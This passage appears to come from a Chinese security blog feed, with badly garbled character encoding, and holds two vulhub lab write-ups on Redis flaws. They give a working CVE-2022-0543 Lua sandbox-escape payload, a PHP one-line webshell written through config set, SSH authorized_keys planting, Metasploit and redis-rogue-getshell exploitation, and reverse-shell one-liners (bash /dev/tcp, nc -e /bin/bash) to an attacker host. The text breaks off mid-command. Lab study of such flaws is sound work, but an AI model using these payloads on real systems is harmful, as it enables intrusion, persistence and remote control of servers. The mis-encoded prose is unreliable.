    <summary type="html">ğŸ¥§kaliæ‰©å±•ç¡¬ç›˜ï¼Œä»¥åŠå¯¼è‡´å¼€æœºå»¶è¿Ÿé—®é¢˜ï¼Œä¸€ç›´å¡åœ¨ç™»å½•ç•Œé¢çš„é—®é¢˜è§£å†³ï¼›vmè™šæ‹Ÿæœºkaliæ‰©å±•ç¡¬ç›˜æ•™ç¨‹ï¼›kaliæ‰©å±•ç¡¬ç›˜åçš„å¼€æœºæ…¢é—®é¢˜è§£å†³æ–¹æ³•</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€vulhubæ¼æ´é¶åœºã€‘redisæ¼æ´ï¼ˆæ²™ç›’é€ƒé€¸ï¼‰CVE-2022-0543åŠæ¼æ´å¤ç°</title>
    <link href="https://blog.m3x1.cn/posts/50ac647a.html"/>
    <id>https://blog.m3x1.cn/posts/50ac647a.html</id>
    <published>2025-03-25T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.615Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ¼æ´è¯¦æƒ…">æ¼æ´è¯¦æƒ…</h2><h3 id="å—å½±å“çš„ç³»ç»Ÿ">å—å½±å“çš„ç³»ç»Ÿ</h3><ul><li><strong>ä»…é™äº Debian ç³» Linux å‘è¡Œç‰ˆ</strong>ï¼ˆå¦‚ Debianã€Ubuntuï¼‰åŠå…¶è¡ç”Ÿç‰ˆæœ¬ã€‚</li><li><strong>ä¸å—å½±å“çš„ç³»ç»Ÿ</strong>ï¼šCentOSã€RHEL ç­‰é Debian ç³»å‘è¡Œç‰ˆä¸å—æ­¤æ¼æ´å½±å“ï¼ˆæ¼æ´æºäº Debian ç»´æŠ¤è€…åœ¨æ‰“åŒ… Redis æ—¶çš„è¡¥ä¸é—®é¢˜ï¼Œè€Œé Redis è‡ªèº«ä»£ç é—®é¢˜ï¼‰ã€‚</li></ul><h3 id="å—å½±å“çš„-Redis-ç‰ˆæœ¬èŒƒå›´">å—å½±å“çš„ Redis ç‰ˆæœ¬èŒƒå›´</h3><ul><li>redisç‰ˆæœ¬å°äºç­‰äº6.xçš„éƒ½å¯ä»¥å°è¯•ã€‚</li></ul><h3 id="è§¦å‘æ¡ä»¶">è§¦å‘æ¡ä»¶</h3><p>æ”»å‡»è€…éœ€å…·å¤‡ Redis çš„æœªæˆæƒè®¿é—®æƒé™æˆ–åˆæ³•å‡­è¯ã€‚</p><h2 id="æ¼æ´åŸç†">æ¼æ´åŸç†</h2><h3 id="èƒŒæ™¯">èƒŒæ™¯</h3><p>Redis å…è®¸é€šè¿‡ <code>eval</code> å‘½ä»¤æ‰§è¡Œ Lua è„šæœ¬ï¼Œä½†æ­£å¸¸æƒ…å†µä¸‹è¿™äº›è„šæœ¬è¿è¡Œåœ¨æ²™ç®±ä¸­ï¼Œæ— æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–æ–‡ä»¶æ“ä½œã€‚</p><h3 id="è¡¥ä¸å¼•å…¥çš„æ¼æ´">è¡¥ä¸å¼•å…¥çš„æ¼æ´</h3><p>Debian/Ubuntu åœ¨æ‰“åŒ… Redis æ—¶ï¼Œé€šè¿‡è¡¥ä¸ä»£ç å‘ Lua æ²™ç®±ä¸­æ³¨å…¥äº†ä¸€ä¸ªåä¸º <code>package</code> çš„å…¨å±€å¯¹è±¡ã€‚è¯¥å¯¹è±¡æœ¬åº”åœ¨æºç ä¸­è¢«æ³¨é‡Šï¼ˆå‡ºäºæ²™ç®±å®‰å…¨è€ƒè™‘ï¼‰ï¼Œä½†è¡¥ä¸é”™è¯¯åœ°é‡æ–°å¯ç”¨äº†å®ƒã€‚</p><h3 id="æ²™ç›’é€ƒé€¸è¿‡ç¨‹">æ²™ç›’é€ƒé€¸è¿‡ç¨‹</h3><ul><li><strong>åŠ è½½åŠ¨æ€åº“</strong>ï¼šæ”»å‡»è€…å¯é€šè¿‡ <code>package.loadlib</code> åŠ è½½ Lua ç³»ç»Ÿåº“ï¼ˆå¦‚ <code>liblua5.1.so.0</code>ï¼‰ï¼Œè°ƒç”¨å…¶å¯¼å‡ºå‡½æ•°ï¼ˆå¦‚ <code>luaopen_io</code>ï¼‰è·å– <code>io</code> åº“æƒé™ã€‚</li><li><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼šåˆ©ç”¨ <code>io.popen</code> ç­‰å‡½æ•°æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;r&quot;</span>);  <span class="comment">-- æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure><h2 id="æ”»å‡»æ€è·¯">æ”»å‡»æ€è·¯</h2><p>å•ä»æ”»å‡»è§’åº¦è€Œè¨€ï¼Œå¯ä»¥ä½¿ç”¨redisæœªæˆæƒç›¸åŒçš„æ‰“æ³•ï¼Œåšå®¢è§ï¼š<a href="https://www.cnblogs.com/MrSoap/p/18737580">ã€vulhubã€‘redis 4-unacc ï¼ˆredisæœªæˆæƒè®¿é—®ï¼‰ - Mr_Soap - åšå®¢å›­</a></p><p>ä»æ¼æ´è§’åº¦æ¥çœ‹ï¼Œä½¿ç”¨<code>eval</code>å‡½æ•°æ‰§è¡Œä¸Šé¢çš„é€ƒé€¸è¿‡ç¨‹å³å¯ã€‚</p><h2 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h2><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>kaliæ”»å‡»æœºï¼š192.168.192.135</p></blockquote><p>é¶æœºè¿›å…¥vulhub-master/redis/CVE-2022-0543ä¸­ï¼Œä½¿ç”¨dockerå¯åŠ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326161957788.png" alt="image-20250326161957788"></p><p>æ”»å‡»æœºè¿›è¡Œredisæœªæˆæƒè¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.192.132</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162311984.png" alt="image-20250326162311984"></p><p>è¿›è¡Œgetshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);local io = io_l();local f = io.popen(&quot;whoami&quot;, &quot;r&quot;);local res = f:read(&quot;*a&quot;);f:close();return res;&#x27; 0</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162631517.png" alt="image-20250326162631517"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162822769.png" alt="image-20250326162822769"></p><p>è¯´æ˜å·²ç»èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§ã€vulhubæ¼æ´é¶åœºã€‘redisæ¼æ´ï¼ˆæ²™ç›’é€ƒé€¸ï¼‰CVE-2022-0543æ¼æ´åŸç†åŠæ¼æ´å¤ç°ï¼›redisæ¼æ´ï¼ˆæ²™ç›’é€ƒé€¸ï¼‰CVE-2022-0543æ¼æ´è¯¦æƒ…</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€vulhubæ¼æ´é¶åœºã€‘redisæ¼æ´åŠredisæ¼æ´å¤ç°</title>
    <link href="https://blog.m3x1.cn/posts/2ab81980.html"/>
    <id>https://blog.m3x1.cn/posts/2ab81980.html</id>
    <published>2025-03-24T16:00:00.000Z</published>
    <updated>2025-03-25T04:41:39.422Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ¼æ´è¯¦æƒ…">æ¼æ´è¯¦æƒ…</h2><blockquote><p>å½±å“ç‰ˆæœ¬ Redis 2.xï¼Œ3.xï¼Œ4.xï¼Œ5.x</p></blockquote><p>Redisé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379(åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™)ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç­‰ï¼Œè¿™æ ·å°†ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯(é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚</p><p>æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—®Redisçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„/root/.sshæ–‡ä»¶çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹:</p><p>(1) Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘</p><p>(2) æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç ç™»å½•redisæœåŠ¡</p><h2 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h2><blockquote><p>kalié¶æœºï¼š 192.168.192.132</p><p>kaliæ”»å‡»æœºï¼š192.168.192.135</p></blockquote><h4 id="é¶æœºè®¾ç½®">é¶æœºè®¾ç½®</h4><p>è¿›å…¥vulhubé¶åœºçš„redis/4-unaccç›®å½•ï¼Œè¾“å…¥å‘½ä»¤ï¼Œç„¶åç­‰å¾…åŠ è½½å®Œæ¯•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085647378.png" alt="image-20250325085647378"></p><blockquote><p>å°æç¤ºï¼šå¦‚æœä¸æˆåŠŸï¼Œå¯èƒ½æ˜¯æ²¡æœ‰æŒ‚ä»£ç†ï¼ˆæ‡‚å§ï¼Ÿï¼‰</p></blockquote><p>è¾“å…¥å‘½ä»¤æŸ¥çœ‹ç«¯å£æ˜¯6379</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085748429.png" alt="image-20250325085748429"></p><p>æˆ‘ä»¬ç”¨nmapæ‰«ä¸€ä¸‹é¶æœºï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°6379ç«¯å£æ‰“å¼€äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.192.132 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090133919.png" alt="image-20250325090133919"></p><p>æµè§ˆå™¨è®¿é—®çœ‹çœ‹ï¼Œèƒ½æ‰“å¼€å°±è¡Œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090518098.png" alt="image-20250325090518098"></p><h4 id="æ”»å‡»æœºè®¾ç½®">æ”»å‡»æœºè®¾ç½®</h4><p>å®‰è£…redis-cliè¿œç¨‹è¿æ¥å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure><p>ç„¶åè§£å‹ï¼Œè¿›å…¥è¯¥ç›®å½•è¿›è¡Œç¼–è¯‘ï¼Œç­‰å¾…å®Œæˆã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd redis-stable</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091518998.png" alt="image-20250325091518998"></p><p>å‡ºç°å¦‚ä¸Šç•Œé¢å°±è¯´æ˜æˆåŠŸäº†</p><h4 id="æ¼æ´åˆ©ç”¨æµç¨‹">æ¼æ´åˆ©ç”¨æµç¨‹</h4><h5 id="å†™å…¥webshell">å†™å…¥webshell</h5><ol><li>ç›®æ ‡å¼€å¯äº†webæœåŠ¡å™¨,å¹¶ä¸”çŸ¥é“webè·¯å¾„(å¯ä»¥åˆ©ç”¨phpinfoæˆ–è€…é”™è¯¯æš´è·¯å¾„ç­‰)</li><li>éœ€è¦å…·æœ‰è¯»å†™å¢åˆ æ”¹æŸ¥æƒ</li></ol><p>ç”¨redis-cliå‘½ä»¤è¿œç¨‹å…å¯†ç™»å½•redisä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># æ— å¯†ç ç™»å½•å‘½ä»¤</span><br><span class="line">redis-cli -h ç›®æ ‡ä¸»æœºIP</span><br><span class="line"># æœ‰å¯†ç ç™»å½•å‘½ä»¤</span><br><span class="line">redis-cli -h ç›®æ ‡ä¸»æœºIP -p ç«¯å£6379 -a ç™»å½•å¯†ç </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091905278.png" alt="image-20250325091905278"></p><p>è¿™æ ·å°±è¯´æ˜æˆåŠŸäº†ï¼Œ</p><p>redisæ“ä½œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info  #æŸ¥çœ‹redisçš„ä¿¡æ¯å’ŒæœåŠ¡å™¨ä¿¡æ¯</span><br><span class="line">flushall åˆ é™¤æ‰€æœ‰æ•°æ®</span><br><span class="line">del key  åˆ é™¤é”®ä¸ºkeyçš„æ•°æ®</span><br><span class="line">get key  è·å¾—å‚æ•°keyçš„æ•°æ®</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html  #å°†shellç§»åˆ°ç½‘ç«™é»˜è®¤æ ¹ç›®å½•</span><br><span class="line">config set dbfilename redis.php #åˆ›å»ºshellæ–‡ä»¶</span><br><span class="line">set webshell &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;  å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åèšå‰‘è¿æ¥</span><br><span class="line">æˆ–è€…</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[1]); ?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ç”±äºé¶æœºæ²¡æœ‰å¼€å¯webæœåŠ¡ï¼Œæ‰€ä»¥å°±ä¸æ¼”ç¤ºäº†ã€‚</p><h5 id="ä½¿ç”¨pyè„šæœ¬æ‰§è¡Œè¿œç¨‹å‘½ä»¤">ä½¿ç”¨pyè„šæœ¬æ‰§è¡Œè¿œç¨‹å‘½ä»¤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/redis-rogue-getshell.git</span><br><span class="line">cd redis-rogue-getshell/RedisModulesSDK/exp</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325094921511.png" alt="image-20250325094921511"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ../../   #å›åˆ°redis-rogue-getshellç›®å½•ä¸‹</span><br><span class="line">./redis-master.py -r 192.168.239.128 -p 6379 -L 192.168.239.128 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</span><br><span class="line">(ç¬¬ä¸€ä¸ªipæ˜¯é¶æœºï¼Œç¬¬äºŒä¸ªipæ˜¯æ”»å‡»æœº,-cåé¢è·Ÿæ‰§è¡Œçš„å‘½ä»¤)</span><br></pre></td></tr></table></figure><h5 id="sshå…¬ç§é’¥å…å¯†ç™»å½•">sshå…¬ç§é’¥å…å¯†ç™»å½•</h5><h6 id="åŸç†">åŸç†</h6><p>ç™»é™†linuxæœ‰å‡ ç§æ–¹å¼ï¼Œæœ€å¸¸ç”¨çš„æ˜¯å¯†ç ç™»é™†å’ŒRSA key ç™»é™†ï¼ŒRSA keyç™»é™†æ˜¯ç”Ÿæˆä¸€ä¸ªå…¬ç§å¯¹åº”çš„ç§˜é’¥ï¼Œç„¶åå°†å…¬é’¥æ”¾åˆ°linuxç³»ç»Ÿçš„/root/.ssh/authorized_keysçš„æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æœ¬åœ°å®¢æˆ·ç«¯é€šè¿‡å¯¼å…¥å¯¹åº”ç§é’¥è¿›è¡Œç™»é™†ï¼Œè¿™å°±æ˜¯RSA keyçš„ç™»é™†æ–¹å¼ã€‚</p><h6 id="ä¸ºä»€ä¹ˆrediså¯ä»¥è·å–æœåŠ¡å™¨çš„rootæƒé™å‘¢ï¼Ÿ">ä¸ºä»€ä¹ˆrediså¯ä»¥è·å–æœåŠ¡å™¨çš„rootæƒé™å‘¢ï¼Ÿ</h6><p>ä¸Šé¢RSA keyçš„ç™»é™†æ–¹å¼åœ¨æœåŠ¡å™¨æ–¹é¢æ˜¯è¦å°†å…¬é’¥å†™å…¥authorized_keysæ–‡ä»¶ä¸­çš„ï¼Œè€Œredisæœ‰ä¸€ç§æŒä¹…åŒ–æ–¹å¼æ˜¯ç”ŸæˆRDBæ–‡ä»¶ï¼Œé€šè¿‡æŒä¹…åŒ–å°†å…¬é’¥å†™å…¥rootä¸‹çš„authored_keysæ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å°†éæ³•çš„å…¬é’¥å†™åˆ°äº†éªŒè¯æ–‡ä»¶é‡Œï¼Œåé¢æˆ‘ä»¬æ‹¿å¯¹åº”ç§é’¥ç™»é™†å³å¯ã€‚ï¼ˆä½†æ˜¯è¿™ç§æ–¹å¼éœ€è¦redisæ˜¯rootå¯åŠ¨çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œå› ä¸ºérootæƒé™æ— æ³•è¿›å…¥/rootç›®å½•ï¼‰</p><h6 id="æ­¥éª¤">æ­¥éª¤</h6><p>åœ¨æ”»å‡»æœºä¸­ç”Ÿæˆsshå…¬é’¥å’Œç§é’¥æ–‡ä»¶ï¼Œå¯†ç ä¸ºç©º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>è¿›å…¥/home/kali/.sshç›®å½•: å°†ç”Ÿæˆçš„å…¬é’¥ä¿å­˜åˆ°sshkey.txtï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; sshkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102503591.png" alt="image-20250325102503591"></p><p>ä½¿ç”¨redis-cli -h ipå‘½ä»¤è¿æ¥é¶æœºï¼ŒæŠŠsshkey.txtå†™å…¥redisä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sshkey.txt | redis-cli -h 192.168.192.132 -x set crack</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102811549.png" alt="image-20250325102811549"></p><p>ç„¶åç”¨redis-cliè¿æ¥é¶æœºï¼Œç„¶åæ›´æ”¹ç›®æ ‡æœåŠ¡å™¨Rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½•(é»˜è®¤ä¸º/root/.ssh)</p><p>æ­¤å¤„å› ä¸ºé¶åœºä¸­çš„redisæ²¡æœ‰rootæƒé™ï¼Œå°±ä¸æ¼”ç¤ºäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br></pre></td></tr></table></figure><p>è®¾ç½®ä¸Šä¼ å…¬é’¥å¤‡ä»½æ–‡ä»¶åä¸ºauthorized_keys:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æ”»å‡»æœºä¸Šä½¿ç”¨sshå…å¯†ç ç™»å½•é¶æœºï¼Œåˆ©ç”¨ç§é’¥å°±èƒ½æˆåŠŸç™»å…¥redisæœåŠ¡å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@ip</span><br></pre></td></tr></table></figure><h5 id="ä½¿ç”¨msfè¿›è¡Œæ¼æ´åˆ©ç”¨">ä½¿ç”¨msfè¿›è¡Œæ¼æ´åˆ©ç”¨</h5><p>ä½¿ç”¨searchsploitæœç´¢redisç›¸å…³æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit redis</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325104753221.png" alt="image-20250325104753221"></p><p>å¯ä»¥çœ‹åˆ°ç›¸å…³æ¼æ´éƒ½åœ¨metasploité‡Œ</p><p>å¯åŠ¨metasploitï¼ˆæ³¨æ„è¦åœ¨rootä¸‹å¯åŠ¨ï¼Œä¸ç„¶æ”»å‡»æ—¶ä¼šæŠ¥é”™ï¼‰,ç„¶åæ£€ç´¢redisç›¸å…³exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search redis type:exploit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325105152802.png" alt="image-20250325105152802"></p><p>çœ‹åˆ°æœ‰ä¸€ä¸ªcmdåˆ©ç”¨çš„æ¼æ´ï¼Œä½¿ç”¨è¯¥æ¨¡å—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/redis/redis_replication_cmd_exec</span><br></pre></td></tr></table></figure><p>ç„¶åæŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set LHOST 192.168.192.135</span><br><span class="line">set RHOST 192.168.192.132</span><br><span class="line">set SRVHOST 192.168.192.135</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325110217792.png" alt="image-20250325110217792"></p><p>ç„¶åè¿è¡Œï¼Œå‡ºç°å¦‚ä¸‹æƒ…å†µå°±æˆåŠŸäº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325111732432.png" alt="image-20250325111732432"></p><h5 id="åå¼¹è¿æ¥">åå¼¹è¿æ¥</h5><p>è¿™ä¸ªæ–¹æ³•ä¸»è¦é€‚ç”¨äºé©¬è¢«æ€äº†ï¼Œæˆ–è€…é¶æœºåœ¨å†…ç½‘ä¹‹ä¸­ã€‚</p><p>å¸¸è§ç«¯å£ç›‘å¬æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">netcatï¼šnc -lvp 7777</span><br><span class="line"></span><br><span class="line">msfï¼š</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.37.130</span><br><span class="line">set lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">socatï¼šsocat TCP-LISTEN:7777 - (kaliç³»ç»Ÿ)</span><br></pre></td></tr></table></figure><p>å¸¸è§å»ºç«‹è¿æ¥æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux bashï¼š</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/æ”»å‡»æœºip/æ”»å‡»æœºç›‘å¬ç«¯å£ 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">netcatï¼š</span><br><span class="line">nc -e /bin/bash æ”»å‡»æœºip æ”»å‡»æœºç›‘å¬ç«¯å£</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å°±æ¼”ç¤ºncå’Œbashçš„é…åˆï¼š</p><p>æ”»å‡»æœºè¿›è¡Œncç›‘å¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>é¶æœºä½¿ç”¨bash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i 